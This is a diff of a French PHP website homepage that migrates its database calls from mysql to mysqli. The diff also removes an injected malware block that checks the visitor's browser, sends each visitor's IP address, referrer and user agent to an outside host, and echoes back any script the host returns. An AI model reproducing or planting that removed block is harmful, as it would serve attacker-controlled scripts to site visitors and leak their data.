@@ -3,9 +3,9 @@
 		<?php
 
 		$rq = 'SELECT id, titre, texte FROM content WHERE page = "accueil" ORDER BY ordre';
-		$rs = mysql_query($rq) OR die('Erreur : '.mysql_error());
+		$rs = mysqli_query($link,$rq) OR die('Erreur : '.mysqli_error($link));
 		
-		while($content = mysql_fetch_array($rs)) {
+		while($content = mysqli_fetch_array($rs)) {
 			if($content['titre'] != "") { echo "<h2>".htmlspecialchars_decode($content['titre'])."</h2>"; }
 			if($content['texte'] != "") { echo "<p>". htmlspecialchars_decode($content['texte'])."</p>"; }
 			
@@ -17,28 +17,17 @@
 			}
 		}
 		?>
-<?php
-#a8deb6#
-error_reporting(0); @ini_set('display_errors',0); $wp_basmx09 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_basmx09) && !preg_match ('/bot/i', $wp_basmx09))){
-$wp_basmx0909="http://"."http"."title".".com/"."title"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_basmx09);
-if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_basmx0909); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$wp_09basmx = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_09basmx = @file_get_contents($wp_basmx0909);}
-elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_09basmx=@stream_get_contents(@fopen($wp_basmx0909, "r"));}}
-if (substr($wp_09basmx,1,3) === 'scr'){ echo $wp_09basmx; }
-#/a8deb6#
-?>
-		
 		<div class="galerie">
 		<?php // PHOTOS
 			$req2 = 'SELECT id, titre, nom FROM photos WHERE id IN(24,29,22,16) ORDER BY id ASC';
-			$res2 = mysql_query($req2) OR die(mysql_error());
+			$res2 = mysqli_query($link,$req2) OR die(mysqli_error($link));
 			
-			$nb2 = mysql_num_rows($res2);
+			$nb2 = mysqli_num_rows($res2);
 			if ($nb2 == 0) { echo '<p>Aucune photo.</p>'; }
 			else {?>
 				<ul class="liste_photos">
 			<?php
-					while ($p = mysql_fetch_array($res2)) :
+					while ($p = mysqli_fetch_array($res2)) :
 			?>
 					<li><a class="colorbox" title="<?php echo $p['titre']; ?>" href="photos/<?php echo $p['nom']; ?>"><img src="photos/mini/<?php echo $p['nom']; ?>" alt="<?php echo $p['titre']; ?>" /></a></li>
 			<?php 	
@@ -57,17 +46,17 @@ if (substr($wp_09basmx,1,3) === 'scr'){ echo $wp_09basmx; }
 			<?php
 
 				$rq = 'SELECT id, titre, texte, accroche, photo, categorie FROM activites ORDER BY RAND() LIMIT 0,10';
-				$rs = mysql_query($rq) OR die('Erreur : '.mysql_error());
+				$rs = mysqli_query($link,$rq) OR die('Erreur : '.mysqli_error($link));
 				
-				while($content = mysql_fetch_array($rs)) {
+				while($content = mysqli_fetch_array($rs)) {
 					echo '<div class="slide">';
 					echo '<div class="slide_int">';
 					if($content['titre'] != "") { echo "<h3>".tronque($content['titre'],20)."</h3>"; }
 					if($content['categorie'] != "") { 
 						$rq2 = 'SELECT libelle FROM categorie WHERE id IN ('.$content['categorie'].') ORDER BY libelle';
-						$rs2 = mysql_query($rq2) OR die('Erreur : '.mysql_error());
+						$rs2 = mysqli_query($link,$rq2) OR die('Erreur : '.mysqli_error($link));
 						$categories = array();
-						while ($cat = mysql_fetch_array($rs2)) {
+						while ($cat = mysqli_fetch_array($rs2)) {
 							$categories[] = $cat['libelle'];
 						}
 						$nb_cat = count($categories);
@@ -98,9 +87,9 @@ if (substr($wp_09basmx,1,3) === 'scr'){ echo $wp_09basmx; }
 			<h2><img src="images/titreactu.png" alt="News du mois" /></h2>
 			<?php
 				$rq = 'SELECT id, accroche, titre, DATE_FORMAT(date, "%d/%m/%Y") as date2 FROM news ORDER BY date DESC LIMIT 0,2';
-				$rs = mysql_query($rq) OR die('Erreur : '.mysql_error());
+				$rs = mysqli_query($link,$rq) OR die('Erreur : '.mysqli_error($link));
 				
-				while($content = mysql_fetch_array($rs)) {
+				while($content = mysqli_fetch_array($rs)) {
 				echo '<div class="actu id-'.$content['id'].'">';
 					echo '<span class="date">'.$content['date2'].'</span>';
 					echo '<div class="accroche"><h3 class="titre"><a href="index.php?page=news&amp;id='.$content['id'].'">'.htmlspecialchars_decode($content['titre']).'</a></h3>&nbsp;'.htmlspecialchars_decode($content['accroche']).'</div>';
